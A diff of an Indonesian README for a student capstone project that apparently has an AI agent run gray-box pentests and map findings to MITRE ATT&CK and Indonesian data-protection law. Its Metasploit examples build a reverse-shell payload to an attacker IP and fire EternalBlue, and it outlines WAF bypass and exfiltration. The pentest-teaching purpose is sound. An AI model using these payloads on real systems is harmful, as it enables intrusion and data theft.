@@ -1,21 +1,58 @@
-# Project Unified-Shield: AI-Driven Defense & Compliance
+# 🛡️ Unified-Shield: AI-Driven Pentest & PDP Compliance
 
 > **Capstone Project Cybersecurity 2026 — Kelompok 7**
-> Framework: MITRE ATT&CK + UU No. 27 Tahun 2022 (UU PDP)
-> Pendekatan: Gray Box Penetration Testing dengan AI Agent Orchestration
+>
+> Framework: **MITRE ATT&CK v19.1** (15 Tactics, 75+ Techniques) + **UU No. 27/2022** (UU PDP)
+>
+> Target: **PT. Dana Sejahtera** — Gray Box Penetration Testing via JumpServer Infrastruktur
+>
+> Pendekatan: **AI Agent Orchestration** dengan 30+ Automated Security Tools
 
 ---
 
-## 📌 Executive Summary
+## 📋 Daftar Isi
 
-Project Unified-Shield adalah sistem **AI-driven penetration testing dan compliance auditing** yang mengintegrasikan empat domain keamanan siber:
+1. [Apa Itu Project Ini?](#-apa-itu-project-ini)
+2. [Arsitektur Sistem](#-arsitektur-sistem)
+3. [Struktur Folder](#-struktur-folder)
+4. [Komponen Utama](#-komponen-utama)
+5. [Workflow Pentest (8 Fase)](#-workflow-pentest-8-fase)
+6. [MITRE ATT&CK v19.1 Mapping](#-mitre-attck-v191-mapping)
+7. [UU PDP Compliance](#-uu-pdp-compliance-indonesia)
+8. [Setup & Cara Pakai](#-setup--cara-pakai)
+9. [Deliverables](#-deliverables)
+10. [Integrasi Sinergis (Project 4)](#-integrasi-sinergis-project-4)
+11. [Rubrik Penilaian](#-rubrik-penilaian)
+12. [Tim Pengembang](#-tim-pengembang)
 
-1. **Offensive Security** — Gray box penetration testing dengan credential-based access
-2. **Exploitation** — Metasploit Framework integration untuk payload generation dan exploit execution
-3. **Threat Intelligence** — Mapping otomatis ke framework MITRE ATT&CK Enterprise (data real dari STIX dataset)
-4. **Legal Compliance** — Pemetaan temuan teknis ke UU No. 27 Tahun 2022 tentang Perlindungan Data Pribadi
+---
 
-Sistem ini dirancang untuk **Modul C (Penetration Testing & PDP Compliance)** dan **Project 4 (Integrasi Sinergis)** dari Capstone Project Cybersecurity 2026, dengan target infrastruktur **PT. Dana Sejahtera (Fintech Infrastructure)**.
+## 🎯 Apa Itu Project Ini?
+
+**Bayangkan lo punya sistem keamanan yang bisa:**
+
+1. **Nge-scan** celah keamanan secara otomatis (kayak hacker beneran)
+2. **Nge-map** setiap temuan ke teknik serangan di MITRE ATT&CK
+3. **Ngecek** apakah temuan itu melanggar **UU PDP Indonesia**
+4. **Ngebuatin** laporan lengkap + rekomendasi perbaikan
+
+**Unified-Shield** adalah jawabannya. Sistem AI-powered yang menggabungkan:
+
+| Domain | Kemampuan |
+|--------|-----------|
+| 🔓 **Offensive Security** | Gray box pentesting — login sebagai staff, cari celah, eksploitasi |
+| 💣 **Exploitation** | Generate payload + exploit otomatis via Metasploit Framework |
+| 🧠 **Threat Intelligence** | Mapping otomatis 75+ teknik serangan ke MITRE ATT&CK v19.1 |
+| ⚖️ **Legal Compliance** | Cek otomatis: temuan ini langgar pasal berapa? Sanksinya apa? |
+
+### Kenapa Ini Penting?
+
+Banyak perusahaan punya celah keamanan tapi:
+- ❌ Gak tau cara ngetes secara sistematis
+- ❌ Temuan teknis gak di-mapping ke regulasi
+- ❌ Laporan kepanjangan, susah dibaca manajemen
+
+**Unified-Shield fix semua itu** — dari scanning ➜ mapping ➜ laporan, sekali jalan.
 
 ---
 
@@ -24,606 +61,627 @@ Sistem ini dirancang untuk **Modul C (Penetration Testing & PDP Compliance)** da
 ### High-Level Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                    UNIFIED-SHIELD PLATFORM                       │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  ┌──────────────┐   ┌──────────────┐   ┌──────────────────────┐ │
-│  │  OFFENSIVE   │──▶│ EXPLOITATION │──▶│   INTELLIGENCE       │ │
-│  │   LAYER      │   │    LAYER     │   │      LAYER           │ │
-│  │              │   │              │   │                      │ │
-│  │ • Nmap       │   │ • msfvenom   │   │ • MITRE              │ │
-│  │ • Nuclei     │   │ • msfconsole │   │   ATT&CK             │ │
-│  │ • FFUF       │   │ • Payloads   │   │   (858 tech)         │ │
-│  │ • SQLMap     │   │ • Sessions   │   │                      │ │
-│  │ • Dalfox     │   │ • Post-Exp   │   │                      │ │
-│  └──────────────┘   └──────────────┘   └──────────────────────┘ │
-│         │                   │                   │                │
-│         ▼                   ▼                   ▼                │
-│  ┌──────────────────────────────────────────────────────────┐   │
-│  │              UNIFIED AI AGENT ORCHESTRATOR                │   │
-│  │                                                           │   │
-│  │ • Security Tools Bridge (120+ MCP tools)                │   │
-│  │ • Metasploit MCP Server (20+ tools)                     │   │
-│  │ • MITRE Attack Mapper (333 techniques, 48 articles)     │   │
-│  │ • Credential Manager (multi-account gray box)           │   │
-│  │ • Report Generator (MITRE + UU PDP + Sigma Rules)       │   │
-│  └──────────────────────────────────────────────────────────┘   │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        UNIFIED-SHIELD PLATFORM                          │
+│                                AI AGENT                                 │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  ┌─────────────────┐   ┌─────────────────┐   ┌───────────────────────┐  │
+│  │  🔍 OFFENSIVE   │──▶│  💣 EXPLOITATION │──▶│  🧠 INTELLIGENCE      │  │
+│  │     LAYER       │   │     LAYER        │   │      LAYER            │  │
+│  │                 │   │                  │   │                       │  │
+│  │ • Nmap scan     │   │ • msfvenom      │   │ • MITRE ATT&CK        │  │
+│  │ • Nuclei CVE    │   │   (payload gen) │   │   v19.1 (75 tech)     │  │
+│  │ • FFUF fuzz     │   │ • msfconsole    │   │ • STIX database       │  │
+│  │ • SQLMap        │   │   (exploit exec)│   │   (858 techniques)    │  │
+│  │ • Dalfox XSS    │   │ • Post-exploit  │   │ • Attack chain        │  │
+│  │ • 25+ tools     │   │   session mgmt  │   │   correlation         │  │
+│  └────────┬────────┘   └────────┬─────────┘   └───────────┬───────────┘  │
+│           │                     │                          │              │
+│           ▼                     ▼                          ▼              │
+│  ┌──────────────────────────────────────────────────────────────────┐    │
+│  │              🧠 UNIFIED AI AGENT ORCHESTRATOR                    │    │
+│  │                                                                  │    │
+│  │ • Security Tools Bridge (120+ MCP tools)                        │    │
+│  │ • Metasploit MCP Server (20+ tools)                             │    │
+│  │ • MITRE Attack Mapper (75 techniques, 15 tactics)               │    │
+│  │ • Credential Manager (multi-role gray box)                      │    │
+│  │ • Report Generator (MITRE + UU PDP + Navigator)                 │    │
+│  └──────────────────────────────────────────────────────────────────┘    │
+│           │                     │                          │              │
+│           ▼                     ▼                          ▼              │
+│  ┌─────────────────┐   ┌─────────────────┐   ┌───────────────────────┐  │
+│  │  ⚖️ PDP          │   │  📊 REPORT       │   │  🔄 INTEGRATION       │  │
+│  │  COMPLIANCE      │   │  GENERATOR       │   │  (Project 4)          │  │
+│  │                  │   │                  │   │                       │  │
+│  │ • RAG ChromaDB   │   │ • Markdown      │   │ • Wazuh SIEM          │  │
+│  │   (340 chunks)   │   │ • PDF (print)   │   │ • Threat Hunting      │  │
+│  │ • Pasal mapping  │   │ • ATT&CK Nav    │   │ • Metasploit MCP      │  │
+│  │ • Sanksi matrix  │   │   layer (JSON)  │   │ • Feedback loop       │  │
+│  └─────────────────┘   └─────────────────┘   └───────────────────────┘  │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
 ```
 
-### Komponen Utama
+### Alur Data Sederhana
 
-| Layer | Komponen | Fungsi |
-|-------|----------|--------|
-| **Offensive** | Security Tools Bridge | Eksekusi alat pentest (Nmap, Nuclei, FFUF, SQLMap, Dalfox) |
-| **Exploitation** | Metasploit MCP Server | Payload generation, exploit execution, post-exploitation |
-| **Intelligence** | MITRE ATT&CK Mapper | Mapping 333 teknik serangan ke 14 taktik MITRE |
-| **Compliance** | RAG System (ChromaDB) | 340 chunks UU PDP dengan semantic search |
-| **Orchestration** | UnifiedAIAgent | Koordinasi pentest → MITRE → UU PDP → Report |
-| **Credential** | Credential Manager | Multi-account gray box (attacker, victim, admin) |
+```
+INPUT:     Target URL + Credentials (staff login)
+              │
+              ▼
+STEP 1:    🔍 Scanning (Nmap, Nuclei, FFUF, SQLMap, dll)
+              │
+              ▼
+STEP 2:    🎯 Findings → Mapped ke MITRE ATT&CK technique
+              │
+              ▼
+STEP 3:    ⚖️ Teknik → Dicocokin ke pasal UU PDP
+              │
+              ▼
+OUTPUT:    📄 Laporan lengkap + Rekomendasi remediasi
+```
 
 ---
 
-## 🔧 Struktur Project
+## 📁 Struktur Folder
 
 ```
 Kelompok 7/
-├── README.md                          # Dokumentasi utama (file ini)
-├── CLAUDE.md                          # AI Agent configuration & workflow
-├── Rules_of_Engagement.md             # Rules of Engagement (RoE)
-├── GRAYBOX_QUICKSTART.md              # Quick start guide gray box testing
 │
-├── # Core System
-├── agent_orchestrator.py              # AI Agent Orchestrator (main entry)
-├── tools_bridge.py                    # Security Tools Bridge + MITRE integration
-├── index_uu_pdp.py                    # RAG Indexer: PDF → ChromaDB
+├── README.md                         ← Kamu di sini! Dokumentasi utama
+├── Rules_of_Engagement.md            ← Aturan main pengujian
 │
-├── # MITRE ATT&CK Integration
-├── mitre_attack_db.json               # Database real MITRE STIX (858 techniques)
+├── # 🧠 CORE SYSTEM (Jantungnya)
+├── agent_orchestrator.py             ← AI Agent utama — koordinasi semua fase
+├── tools_bridge.py                    ← Jembatan ke 120+ tools keamanan
+├── index_uu_pdp.py                   ← Indexer UU PDP ke database vektor
+├── run_graybox.py                    ← Runner satu-perintah buat pentest
+│
+├── # 📜 MITRE ATT&CK (Pusat Intelijen)
+├── mitre_attack_db.json              ← Database 858 teknik MITRE ATT&CK
 ├── scripts/
-│   ├── mitre_attack_mapper.py         # MITRE Mapper: action → technique → UU PDP
-│   ├── credential_manager.py          # Credential Manager: multi-account gray box
-│   ├── mcp_metasploit.py              # MCP Server: msfvenom + msfconsole integration
-│   └── install_metasploit.sh          # Metasploit installer
+│   ├── mitre_attack_mapper.py        ← Mapper: aksi → teknik → pasal UU
+│   ├── credential_manager.py         ← Manajemen multi-akun gray box
+│   ├── mcp_metasploit.py             ← MCP Server: msfvenom + msfconsole
+│   └── install_metasploit.sh         ← Installer Metasploit Framework
 │
-├── # AI Agent Skills
+├── # 📚 AI SKILLS (Instruksi AI Agent)
 ├── skills/
-│   ├── api_pentest.md                 # Skill: Autonomous API Pentester
-│   ├── pdp_compliance_auditor.md      # Skill: PDP Compliance Auditor
-│   └── mitre_attack_mapper.md         # Skill: MITRE ATT&CK Mapper
+│   ├── api_pentest.md                ← Skill: API Pentester otomatis
+│   ├── pdp_compliance_auditor.md     ← Skill: Audit UU PDP
+│   └── mitre_attack_mapper.md        ← Skill: Mapping MITRE ATT&CK
 │
-├── # RAG Database
-├── db_uu_pdp/                         # ChromaDB vector store (340 chunks)
-├── UU Nomor 27 Tahun 2022.pdf         # Source document UU PDP
+├── # 🗄️ DATABASE
+├── db_uu_pdp/                        ← ChromaDB vector store (340 chunks UU)
+├── UU Nomor 27 Tahun 2022.pdf        ← Dokumen asli UU PDP
 │
-├── # Configuration
-├── .env.graybox                       # Gray box credentials (gitignored)
-├── .venv/                             # Python virtual environment
-├── .opencode/
-│   └── opencode.jsonc                 # OpenCode MCP configuration
+├── # ⚙️ KONFIGURASI
+├── .env.graybox                      ← Credentials (DI-PROTECT, ga ke-Git!)
 │
-├── # Runner
-├── run_graybox.py                     # One-command gray box pentest runner
+├── # 📦 UNIFIED PDP MCP
+├── unified-pdp/
+│   ├── mcp_server/                   ← MCP server untuk PDP compliance
+│   ├── scripts/                      ← Automation scripts
+│   └── tests/                        ← Unit tests
 │
-└── # Reports & Outputs
-    ├── pentest-report-login-logs.md   # Sample pentest report
-    ├── Final_Unified_Audit_Report.md  # Generated unified audit report
-    └── Remediation_Roadmap.md         # Remediation roadmap
+├── # 🧪 PENTEST TOOLS & SERVER
+├── mcp-pentest-server/               ← Custom MCP server untuk pentest
+│
+└── # 📊 OUTPUT & ARTIFACTS
+    ├── Remediation_Roadmap.md        ← Roadmap perbaikan
+    └── DOKUMENTASI_SISTEM_v2.md      ← Dokumentasi teknis sistem
 ```
 
 ---
 
-## 🛠️ Deliverables Teknis
+## 🧩 Komponen Utama
 
-### 1. RAG Indexing System (`index_uu_pdp.py`)
+### 1. 🧠 AI Agent Orchestrator (`agent_orchestrator.py`)
 
-Sistem indexing UU PDP ke Vector Database:
+Pusat kendali semua operasi. Bekerja dalam 8 fase otomatis:
 
-- **Input:** PDF UU No. 27 Tahun 2022 (77 Pasal)
-- **Proses:** Semantic chunking berbasis nomor Pasal
-- **Output:** ChromaDB dengan 340 chunks vektor
-- **Embedding Model:** `paraphrase-multilingual-MiniLM-L12-v2` (multilingual)
-
-```bash
-python index_uu_pdp.py
+```
+Fase 1: 🔍 Reconnaissance    → Cari tahu target (subdomain, tech stack, JS)
+Fase 2: 🕳️ Vuln Scanning     → Scan celah (CVE, SQLi, XSS, SSRF, dll)
+Fase 3: 🔑 Auth Testing      → Tes login, JWT, IDOR, privilege escalation
+Fase 4: 💣 Exploitation      → Exploit celah via Metasploit
+Fase 5: 🔬 Advanced Testing  → WAF bypass, race condition, GraphQL
+Fase 6: ✅ Validasi          → Skor CVSS, prioritas, quality check
+Fase 7: ⚖️ Legal Audit       → Map ke UU PDP via RAG
+Fase 8: 📄 Report            → Generate laporan MITRE + UU PDP + PDF
 ```
 
-### 2. MITRE ATT&CK Integration
+**Cara pakai:**
+```bash
+python agent_orchestrator.py          # Jalanin semua fase
+python run_graybox.py --setup         # Setup kredensial dulu
+python run_graybox.py                 # Jalanin pentest
+```
 
-Database real dari MITRE STIX dataset dengan mapping komprehensif:
+### 2. 🔗 Security Tools Bridge (`tools_bridge.py`)
 
-| Metric | Value |
-|--------|-------|
-| Source | MITRE official STIX dataset (GitHub) |
-| Total Techniques | 858 (Enterprise ATT&CK) |
-| Techniques Mapped | 333 (pentest-relevant) |
-| UU PDP Articles Covered | **48/48 (100%)** |
-| Total Technique-Pasal Mappings | 1,014 |
-| Taktik MITRE | 14 (Reconnaissance → Impact) |
+Jembatan yang nyambungin 120+ tools keamanan ke MITRE ATT&CK mapping.
+
+Setiap tool output langsung di-mapping ke teknik MITRE:
+
+| Kategori | Tools | Contoh |
+|----------|-------|--------|
+| **🔍 Recon** | Nmap, FFUF, Subfinder, Whatweb | `nmap -sV target.com` ➜ T1046 (Service Discovery) |
+| **🕳️ Vuln** | Nuclei, SQLMap, Dalfox, Nikto | `nuclei -u target.com` ➜ T1190 (Exploit Public App) |
+| **🔑 API** | Kiterunner, Arjun, Swagger | `arjun -u target.com/api` ➜ T1595 (Active Scanning) |
+| **⚡ Exploit** | Metasploit (msfvenom, msfconsole) | `msfvenom -p ...` ➜ T1203 (Exploit for Client Execution) |
+| **🛡️ WAF** | WAF Engine, Adaptive Bypass | `wafw00f target.com` ➜ T1562 (Impair Defenses) |
+
+**Contoh kode:**
+```python
+from tools_bridge import SecurityToolsBridge
+
+bridge = SecurityToolsBridge()
+bridge.set_target("https://target.com")
+bridge.set_auth_token("jwt_token", role="staff")
+bridge.start_mitre_chain("graybox-001")
+
+# Log finding → auto-map ke MITRE + UU PDP
+bridge.log_finding("login_with_credentials", "Staff login OK", "Medium", "/api/v1/auth/login")
+# Hasil: T1078 (Valid Accounts) ➜ Pasal 23, 35, 36, 39, 65
+```
+
+### 3. 🗺️ MITRE ATT&CK Mapper (`scripts/mitre_attack_mapper.py`)
+
+Mapper paling komplet — **75 actions, 15 tactics, 1,014 UU PDP mappings**.
 
 ```python
 from scripts.mitre_attack_mapper import MitreAttackMapper
 
 mapper = MitreAttackMapper()
 result = mapper.map_action("login_with_credentials", evidence="Staff login OK", severity="Medium")
-# Output: T1078 (Valid Accounts) → Pasal 23, 35, 36, 39, 65
+# Output: T1078 (Valid Accounts) ➜ Pasal 23, 35, 36, 39, 65
 ```
 
-### 3. Security Tools Bridge (`tools_bridge.py`)
+### 4. ⚖️ PDP Compliance Auditor (`index_uu_pdp.py` + `skills/pdp_compliance_auditor.md`)
 
-Bridge yang mengintegrasikan 120+ MCP security tools dengan MITRE ATT&CK mapping:
+Sistem **RAG (Retrieval-Augmented Generation)** yang:
+1. **Index** UU No. 27/2022 ke ChromaDB (340 chunks vektor)
+2. **Cocokkan** temuan teknis ke pasal yang relevan
+3. **Keluarkan** pasal + sanksi + rekomendasi mitigasi
 
-| Kategori | Tools | Contoh |
-|----------|-------|--------|
-| **Reconnaissance** | Nmap, FFUF, Subfinder, Whatweb | Service discovery, endpoint enumeration |
-| **Vulnerability** | Nuclei, SQLMap, Dalfox, Nikto | CVE scanning, SQLi, XSS detection |
-| **API Testing** | Kiterunner, Arjun, Swagger | Hidden API discovery, parameter fuzzing |
-| **Credential** | Hydra, John | Brute force, password cracking |
-| **SAST** | Semgrep, Bandit, Brakeman | Static code analysis |
-| **WAF Bypass** | WAF Engine, Adaptive Bypass | Cloudflare, AWS WAF evasion |
-
-```python
-from tools_bridge import SecurityToolsBridge
-
-bridge = SecurityToolsBridge()
-bridge.set_target("https://api.bank-pdp.local")
-bridge.set_auth_token("jwt_token_here", role="staff")
-bridge.start_mitre_chain("graybox-001")
-
-# Auto-mapped to MITRE + UU PDP
-bridge.log_finding("login_with_credentials", "Staff login OK", "Medium", "/api/v1/auth/login")
-# → T1078 (Valid Accounts) → Pasal 23, 35, 36, 39, 65
+```bash
+python index_uu_pdp.py                # Index UU PDP (sekali aja)
 ```
 
-### 4. Metasploit MCP Server (`scripts/mcp_metasploit.py`)
+### 5. 💣 Metasploit MCP Server (`scripts/mcp_metasploit.py`)
 
-Integrasi Metasploit Framework sebagai MCP server untuk payload generation dan exploit execution:
+Integrasi Metasploit Framework sebagai server MCP. 20+ tools siap pakai:
 
-| Tool | Fungsi | Contoh Penggunaan |
-|------|--------|-------------------|
-| **msfvenom** | Payload generation | Reverse shells, webshells, Android APKs, shellcode |
-| **msfconsole** | Exploit execution | Module search, exploit run, session management |
-| **Resource Scripts** | Automated chains | Multi-step attack automation |
+| Tool | Fungsi |
+|------|--------|
+| `msfvenom_generate_payload` | Generate reverse shell, webshell, Android APK |
+| `msfconsole_exploit` | Eksekusi exploit (EternalBlue, SMBGhost, etc) |
+| `msfconsole_search` | Cari module exploit berdasarkan CVE/tech |
+| `msfconsole_sessions` | Manage sesi post-exploitation |
 
 ```python
 # Generate payload
 msfvenom_generate_payload(
     payload="linux/x64/meterpreter/reverse_tcp",
-    lhost="10.10.14.5",
-    lport="4444",
-    format="elf",
-    output_file="/tmp/payload.elf"
+    lhost="10.10.14.5", lport="4444",
+    format="elf", output_file="/tmp/payload.elf"
 )
 
-# Start handler
-msfconsole_start_handler(
-    payload="multi/handler",
-    lhost="10.10.14.5",
-    lport="4444",
-    handler_type="reverse_tcp",
-    run=True
-)
-
-# Search exploits
+# Search + run exploit
 msfconsole_search(query="smb", search_type="exploit")
-
-# Execute exploit
 msfconsole_exploit(
     module="exploit/windows/smb/ms17_010_eternalblue",
     rhost="10.10.10.40",
     payload="windows/x64/meterpreter/reverse_tcp",
-    lhost="10.10.14.5",
-    lport="4444"
+    lhost="10.10.14.5", lport="4444"
 )
 ```
 
-**Available MCP Tools (20+ tools):**
-- `msfvenom_list_payloads`, `msfvenom_list_formats`, `msfvenom_list_encoders`
-- `msfvenom_generate_payload`, `msfvenom_generate_shellcode`
-- `msfvenom_generate_webshell`, `msfvenom_generate_android_apk`
-- `msfconsole_execute`, `msfconsole_start_handler`, `msfconsole_search`
-- `msfconsole_exploit`, `msfconsole_auxiliary`, `msfconsole_post`
-- `msfconsole_sessions`, `msfconsole_session_command`, `msfconsole_resource_script`
-- `msfconsole_db_status`, `msfconsole_workspace`, `msfconsole_hosts`, `msfconsole_services`
+### 6. 🔑 Credential Manager (`scripts/credential_manager.py`)
 
-### 5. Credential Manager (`scripts/credential_manager.py`)
+Manajemen kredensial multi-role buat gray box testing:
 
-Sistem manajemen kredensial untuk gray box testing dengan multi-account support:
+| Role | Fungsi | Skenario |
+|------|--------|----------|
+| **Attacker** | Akun staff biasa | Initial access, discovery, IDOR horizontal |
+| **Victim** | Akun user target | Target IDOR, data exposure |
+| **Admin** | Akun admin | Privilege escalation, IDOR vertikal |
 
-| Role | Fungsi | Testing Scenario |
-|------|--------|-----------------|
-| **Attacker** | Akun staff | Initial access, discovery, horizontal IDOR |
-| **Victim** | Akun user | Target IDOR testing, data exposure |
-| **Admin** | Akun admin | Privilege escalation, vertical IDOR |
+### 7. 🗄️ RAG System (ChromaDB)
 
-```bash
-# Interactive setup
-python run_graybox.py --setup
+Database vektor untuk pencarian semantik UU PDP:
+- **340 chunks** dari 77 pasal UU PDP
+- **Embedding model:** `paraphrase-multilingual-MiniLM-L12-v2`
+- **Query:** Bahasa Indonesia natural → cocokin ke pasal
 
-# Quick run
-python run_graybox.py --target https://target.api --cookie "jms_sessionid=abc123"
+---
 
-# Check status
-python run_graybox.py --status
-```
+## 🔄 Workflow Pentest (8 Fase)
 
-### 6. AI Agent Orchestrator (`agent_orchestrator.py`)
+Berikut alur lengkap dari awal sampai laporan jadi:
 
-Pusat kendali yang mengkoordinasikan seluruh workflow:
+### Fase 1: 🔍 Reconnaissance (Pencarian Informasi)
 
 ```
-Step 1: RECONNAISSANCE (8 automated tools)
-  ├── Subdomain enum → subfinder + crt.sh + dnsx + httpx
-  ├── Tech fingerprinting → whatweb + favicon + headers + DNS
-  ├── JS recon → 9-phase pipeline (secrets, endpoints, crypto)
-  ├── Hidden endpoints → wellknown + leaks + error logs + FFUF
-  └── API discovery → Swagger + Kiterunner + Arjun
+Tools: subfinder, crt.sh, dnsx, httpx, whatweb, favicon, gau, katana
+       LinkFinder, SecretFinder, FFUF, Kiterunner, Arjun, Swagger
+       
+Output: Daftar subdomain, teknologi, endpoint API, JS secrets
+```
 
-Step 2: VULNERABILITY SCANNING (8 automated tools)
-  ├── Nuclei → 1000+ CVE templates + headless DOM testing
-  ├── SQLMap → SQL injection automated
-  ├── Dalfox → XSS automated
-  ├── Param reflection → XSS/open redirect candidates
-  ├── CORS scan → misconfiguration testing
-  ├── LFI → path traversal automated
-  ├── SSTI → template injection automated
-  └── Open Redirect → automated testing
+**Apa yang terjadi:**
+1. Cari semua subdomain (subfinder + crt.sh)
+2. Cek teknologi yang dipake (whatweb + favicon hash)
+3. Ekstrak endpoint dari JavaScript (LinkFinder + SecretFinder)
+4. Cari hidden path (FFUF + Kiterunner)
+5. Temuin parameter tersembunyi (Arjun)
+6. Cek dokumentasi API (Swagger)
 
-Step 3: AUTH & AUTHORIZATION TESTING
-  ├── JWT analysis, auth heartbeat, IDOR/BOLA
-  ├── Mass assignment, privilege escalation
-  └── Two-account testing (attacker vs victim)
+### Fase 2: 🕳️ Vulnerability Scanning (Scan Celah)
 
-Step 4: EXPLOITATION (Metasploit)
-  ├── Module search, payload generation
-  ├── Exploit execution (if in scope)
-  └── Post-exploitation enumeration
+```
+Tools: Nuclei, SQLMap, Dalfox, Nikto, CORS scan, LFI scan
+       SSTI scan, Open Redirect scan, Param reflection
+       
+Output: Daftar celah dengan severity (Critical/High/Medium/Low)
+```
 
-Step 5: ADVANCED TESTING
-  ├── WAF profiling & bypass, HTTP smuggling
-  ├── Race condition, WebSocket testing
-  ├── Error triggering, HTTP methods
-  └── GraphQL, Next.js Server Actions
+**Apa yang terjadi:**
+1. Scan 1000+ CVE template (Nuclei)
+2. Tes SQL injection (SQLMap)
+3. Tes XSS (Dalfox + manual reflection test)
+4. Tes CORS misconfiguration
+5. Tes LFI/Path Traversal
+6. Tes SSTI (Server-Side Template Injection)
+7. Tes Open Redirect
 
-Step 6: FINDINGS VALIDATION & SCORING
-  ├── CVSS v3.1 scoring (proper vector strings)
-  ├── Triage & prioritization (ROI scoring)
-  └── 9-gate validation before report
+### Fase 3: 🔑 Authentication & Authorization Testing (Tes Login & Izin)
 
-Step 7: LEGAL COMPLIANCE AUDIT
-  ├── RAG-based legal mapping → UU PDP
-  ├── MITRE ATT&CK mapping → techniques + sanctions
-  └── Export Navigator layer + chain report
+```
+Tools: JWT analyzer, Auth heartbeat, IDOR/BOLA tester
+       Mass assignment tester, Privilege escalation tester
+       
+Output: Validasi: bisa gak akses data orang lain? Bisa gak jadi admin?
+```
 
-Step 8: REPORT GENERATION
-  ├── Markdown report (CVSS + MITRE + UU PDP)
-  ├── PDF conversion (WeasyPrint)
-  └── Display results + artifact list
+**Apa yang terjadi:**
+1. Analisis JWT (bisa gak bypass signature?)
+2. Tes IDOR/BOLA (ganti ID, dapet data orang lain?)
+3. Tes Mass Assignment (tambah field `is_superuser:true`?)
+4. Tes Privilege Escalation (staff ➜ admin?)
+5. Two-account testing (akun A vs akun B)
+
+### Fase 4: 💣 Exploitation (Eksploitasi via Metasploit)
+
+```
+Tools: msfvenom, msfconsole, Meterpreter
+       
+Output: Payload, exploit execution, post-exploitation session
+```
+
+**Apa yang terjadi:**
+1. Cari module exploit yang cocok buat tech target
+2. Generate payload (reverse shell, webshell)
+3. Execute exploit (kalo di scope)
+4. Post-exploitation: enum sistem, collect data
+
+### Fase 5: 🔬 Advanced Testing (Tes Lanjutan)
+
+```
+Tools: WAF bypass engine, HTTP smuggler, Race condition
+       WebSocket tester, Error trigger, GraphQL scanner
+       
+Output: Celah lanjutan yang tools biasa gak detect
+```
+
+**Apa yang terjadi:**
+1. Profil WAF + bypass (Cloudflare/AWS/Akamai)
+2. HTTP Request Smuggling
+3. Race condition (20-50 request simultan)
+4. WebSocket tanpa auth
+5. Trigger error buat dapetin stack trace
+6. GraphQL introspection + CSRF
+
+### Fase 6: ✅ Findings Validation & Scoring (Validasi & Skor)
+
+```
+Tools: CVSS v3.1 calculator, Triage scorer, Pre-report quality check
+       
+Output: Temuan terskor + prioritas (P1/P2/P3/P4)
+```
+
+**Apa yang terjadi:**
+1. Skor CVSS v3.1 (vector proper: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
+2. Prioritas berdasarkan ROI (payout / effort)
+3. Quality check 6-item: sibling endpoints, chain potential, dual account, dll
+
+### Fase 7: ⚖️ Legal Compliance Audit (Audit Hukum)
+
+```
+Tools: RAG ChromaDB, UU PDP mapper, MITRE-UU PDP correlator
+       
+Output: Tiap temuan → Pasal berapa? Sanksi apa?
+```
+
+**Apa yang terjadi:**
+1. Query RAG: "akses data tanpa izin" ➜ Pasal 35, 38, 39
+2. Map teknik MITRE ke pasal UU PDP (1,014 mapping)
+3. Output risiko hukum + potensi sanksi
+
+**Contoh mapping:**
+```
+Temuan: IDOR di /api/v1/users/{id} — bisa akses data user lain
+  ➜ T1210 (Exploitation of Remote Services)
+  ➜ Pasal 38 (Perlindungan Tidak Sah)
+  ➜ Pasal 39 (Pencegahan Akses Tidak Sah)
+  ➜ Sanksi: Pidana penjara 5 tahun + denda Rp 50M
+```
+
+### Fase 8: 📄 Report Generation (Buat Laporan)
+
+```
+Tools: Report generator, WeasyPrint PDF, ATT&CK Navigator
+       
+Output: 3 file: Markdown report + PDF + ATT&CK Navigator layer
+```
+
+**Apa yang dihasilkan:**
+1. ✅ Laporan Markdown (lengkap: temuan, CVSS, MITRE, UU PDP)
+2. ✅ PDF siap print (professional styling via WeasyPrint)
+3. ✅ ATT&CK Navigator layer (visual heatmap teknik yang kena)
+
+---
+
+## 🗺️ MITRE ATT&CK v19.1 Mapping
+
+### 15 Tactics Coverage
+
+| # | Tactic | Techniques | Contoh Teknik |
+|---|--------|-----------|---------------|
+| 1 | **🔍 Reconnaissance** | 8 | T1595 (Active Scanning), T1580 (Cloud Enum) |
+| 2 | **🚪 Initial Access** | 6 | T1078 (Valid Accounts), T1190 (Exploit Public App) |
+| 3 | **⚡ Execution** | 14 | T1059 (Command Interpreter), T1204 (User Execution) |
+| 4 | **🔄 Persistence** | 14 | T1136 (Create Account), T1098 (Account Manip) |
+| 5 | **⬆️ Privilege Escalation** | 25 | T1068 (Exploit for PrivEsc), T1548 (Abuse Elevation) |
+| 6 | **🛡️ Defense Evasion** | 42 | T1070 (Indicator Removal), T1562 (Impair Defenses) |
+| 7 | **🔑 Credential Access** | 42 | T1539 (Steal Cookie), T1552 (Unsecured Creds) |
+| 8 | **🔎 Discovery** | 30 | T1087 (Account Disc), T1046 (Service Disc) |
+| 9 | **🔄 Lateral Movement** | 18 | T1021 (Remote Services), T1210 (Exploit Remote Svc) |
+| 10 | **📥 Collection** | 28 | T1005 (Local System), T1114 (Email Collection) |
+| 11 | **📡 Command & Control** | 22 | T1071 (App Layer Protocol), T1573 (Encrypt C2) |
+| 12 | **🚀 Exfiltration** | 16 | T1567 (Exfil Over Web), T1041 (Exfil Over C2) |
+| 13 | **💥 Impact** | 15 | T1486 (Data Encrypted), T1485 (Data Destruct) |
+| 14 | **🏗️ Resource Dev** | 8 | T1583 (Acquire Infrastructure) |
+| 15 | **🧪 Defense Impairment** | 5 | T1562.008 (Disable Cloud Logs) |
+
+**Total: 15 tactics, 75+ techniques, 1,014 UU PDP mappings**
+
+### Contoh Attack Chain Lengkap
+
+```
+1. Login staff ➜ T1078 (Valid Accounts) ➜ Pasal 23, 35, 36, 39
+     │
+     ▼
+2. Enumerate users ➜ T1087 (Account Discovery) ➜ Pasal 32, 38
+     │
+     ▼
+3. IDOR test ➜ T1210 (Exploit Remote Svc) ➜ Pasal 38, 39
+     │
+     ▼
+4. Mass Assignment ➜ T1068 (Priv Escalation) ➜ Pasal 35, 39
+     │
+     ▼
+5. Extract PII ➜ T1213 (Data Repos) ➜ Pasal 16, 35, 38
+     │
+     ▼
+6. Exfiltrate data ➜ T1567 (Exfil Web) ➜ Pasal 35, 38, 45, 46
